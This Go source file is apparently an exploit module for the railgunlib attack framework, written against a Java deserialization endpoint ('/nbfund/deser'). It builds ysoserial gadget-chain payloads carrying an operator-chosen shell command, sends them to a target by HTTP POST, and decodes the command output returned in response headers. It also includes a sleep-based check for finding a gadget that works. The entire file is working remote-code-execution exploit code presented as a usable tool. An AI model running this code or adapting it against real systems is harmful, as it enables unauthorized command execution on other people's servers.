package exp_product1

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"time"
)

type Exp_YsoDemo struct {
	exp_templates.ExpTemplate
}

func (self *Exp_YsoDemo) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	params := "params=" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/nbfund/deser"), params, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("无回显，自行检查")
	return
}

func (self *Exp_YsoDemo) Attack_cmd2() (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders()
	// 获取yso payload
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	params := "params=" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	// cmd插入头部
	self.AddEncodeCmdHeader(headers, self.MustGetStringParam("cmd"))

	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/nbfund/deser"), params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))

	if self.CheckRespHeader(httpresp.Resp.Header) {
		self.EchoSuccessMsg("利用成功")
		// 解码响应数据
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		self.EchoSuccessMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

func (self *Exp_YsoDemo) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	// 获取yso payload
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), "")
	params := "params=" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))

	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/nbfund/deser"), params, headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_YsoDemo) Attack_cmd3() (expResult exp_model.ExpResult) {
	self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)

	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_YsoDemo{}, "exp_ysoDemo.yml")

}
